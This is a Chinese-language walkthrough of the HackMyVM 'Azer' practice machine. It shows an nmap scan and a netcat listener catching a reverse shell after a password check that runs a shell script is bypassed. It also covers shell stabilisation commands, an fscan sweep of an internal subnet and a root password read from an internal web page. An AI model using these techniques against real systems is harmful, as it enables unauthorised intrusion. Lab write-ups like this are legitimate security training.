# 0.简介

**靶机**：[hackmyvm - azer](https://hackmyvm.eu/machines/machine.php?vm=Azer)
**难度**：绿色
**目标 IP**：192.168.205.235
**本机 IP**：192.168.205.141

---

# 1.扫描

使用 `Nmap` 进行初步端口扫描，以识别开放的服务和端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS -p- -Pn -n -T4 192.168.205.235
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 11:19 CST
Nmap scan report for 192.168.205.235
Host is up (0.00038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:07:E9:02 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
                                                           
```

结果显示两个开放端口：

**80/tcp** - HTTP 服务
 **3000/tcp** - 原始显示为 PPP，但实际上是一个 web 应用程序，用于用户认证

---

# 2.踩点

`80`端口页没有发现明显利用点，踩点`3000`端口

![image](https://github.com/user-attachments/assets/3b565e9c-e8cd-41ae-bf84-0cf6e7460d2e)

![image](https://github.com/user-attachments/assets/f2dcad05-b377-43e6-aa7b-159b04935536)

![image](https://github.com/user-attachments/assets/9ab7e04b-b4c3-4d36-9fdf-b4d1c827bf98)

在进一步探索中发现，**3000** 端口的应用程序似乎通过执行 `.sh` 脚本来进行密码验证。利用这一特性，成功绕过了**密码验证**，并建立了**反弹 Shell**。

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.235] 46566
bash: cannot set terminal process group (483): Inappropriate ioctl for device
bash: no job control in this shell
azer@azer:~$ id
id
uid=1000(azer) gid=1000(azer) groups=1000(azer),100(users)

```

---

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

---

# 4.提权

```bash
azer@azer:~$ hostname -I
192.168.205.235 10.10.10.1 172.17.0.1 

azer@azer:~$ ./fscan -h 10.10.10.1/24 -no -np -nopoc

   ___                              _  
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <  
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
10.10.10.1:80 open
10.10.10.10:80 open

```

`-np` 跳过存活检测
`-no` 不保存文件
`-nopoc` 跳过web poc扫描

通过扫描内部网络发现了另一个 IP `10.10.10.10` 正在运行 **HTTP** 服务。

```bash
azer@azer:~$ nc 10.10.10.10 80
Hello
HTTP/1.1 400 Bad Request
Date: Wed, 08 Jan 2025 05:03:33 GMT
Server: Apache/2.4.58 (Unix)
Content-Length: 226
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
</body></html>
azer@azer:~$ curl 10.10.10.10
.:.AzerBulbul.:.
```

访问该服务时，得到了一个看起来像密码的字符串。

```bash
azer@azer:~$ su -
Password: 
root@azer:~# id
uid=0(root) gid=0(root) groups=0(root)

```

成功提权至 root